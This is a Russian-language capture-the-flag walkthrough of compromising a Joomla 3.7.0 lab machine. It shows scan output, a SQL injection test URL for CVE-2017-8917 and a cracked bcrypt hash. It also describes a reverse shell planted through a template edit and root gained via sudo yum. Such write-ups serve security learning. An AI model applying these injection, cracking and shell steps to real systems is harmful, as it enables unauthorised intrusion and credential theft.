Проводим сканирование через nmap. Видим открытые порты 22, 80 и 3306.
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
```

Переходим на веб-сервер.

![](../images/Pasted%20image%2020260527112955.png)

В robots.txt можно найти различные директории

![](../images/Pasted%20image%2020260527113427.png)

В директории администратора - вход в админ панель через Joomla

![](../images/Pasted%20image%2020260527113950.png)

Выполнив запрос можно найти версию Joomla
```
└─$ curl -s http://10.113.159.157/administrator/manifests/files/joomla.xml | grep -E "version|creationDate"
<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
        <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
        <version>3.7.0</version>
        <creationDate>April 2017</creationDate>
```

Для этой версии есть несколько жестких уязвимостей

![](../images/Pasted%20image%2020260527120340.png)

Я нашел уязвимость CVE 2017-8917, думаю она тут сработает, надо проверять

В описании эксплоита показывается как можно проверить, уязвимо ли веб-приложение
```txt
URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
```

Отправляем такой запрос и видим ошибку SQL синтаксиса, а значит это 100% SQL инъекция подтверждена.

![](../images/Pasted%20image%2020260527120512.png)

Запускаем SQLmap. Он подтверждает работу SQLi.

![](../images/Pasted%20image%2020260527122109.png)

Вытаскиваем названия всех БД
```
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test
```

Далее я сделал поиск по слову password, но для joomla ничего не найдено, что довольно странно, в MySQL мы подключиться не сможем.

![](../images/Pasted%20image%2020260527124614.png)

Исследуем БД Joomla

![](../images/Pasted%20image%2020260527125328.png)

Открываем таблицу `__users` и находим id email name password, всё что нужно!

![](../images/Pasted%20image%2020260527125713.png)

Пароль хэширован, запускаем hashcat
```
jonah
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

Через несколько минут хэш подбирается, мы нашли логин и пароль от админ панели.
```
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p...BtZutm
Time.Started.....: Wed May 27 12:59:48 2026 (2 mins, 6 secs)
Time.Estimated...: Wed May 27 13:01:54 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:      375 H/s (17.88ms) @ Accel:1 Loops:32 Thr:16 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 47040/14344385 (0.33%)
Rejected.........: 0/47040 (0.00%)
Restore.Point....: 46816/14344385 (0.33%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#01...: talisay -> michiquita
Hardware.Mon.#01.: Temp: 65c Util: 96% Core:1785MHz Mem:6000MHz Bus:16
```

Обновляем найденные данные
```
jonah
spiderman123
```

Заходим в админ панель и настраиваем шаблон, через него будем прокидывать реверс шел

![](../images/Pasted%20image%2020260527130521.png)

Закидываем код и сохраняем страницу. Нажимаем предпросмотр

![](../images/Pasted%20image%2020260527130713.png)

Получаем входящее соединение!

![](../images/Pasted%20image%2020260527131222.png)

Далее я стабилизировал оболочку.
Прочитать флаг user.txt не удалось, потому что необходимо зайти под другим пользователем - jjameson.

![](../images/Pasted%20image%2020260527133107.png)

Посмотрев файл конфигурации я нашел пароль, исходя из логики, этот пароль может подойти и к ssh единственного живого пользователя на системе. Проверим это.

![](../images/Pasted%20image%2020260527134733.png)

Действительно получилось зайти с этим паролем через ssh на пользователя jjameson. Читаем флаг user.txt

![](../images/Pasted%20image%2020260527134755.png)

Дальше я посмотрел что я могу запустить с правами root и нашел yum. Поискав в интернете я нашел, что это является вектором для эскалации привилегий.

![](../images/Pasted%20image%2020260527135127.png)

Повторяем действия, становимся root и читаем флаг.

![](../images/Pasted%20image%2020260527135416.png)

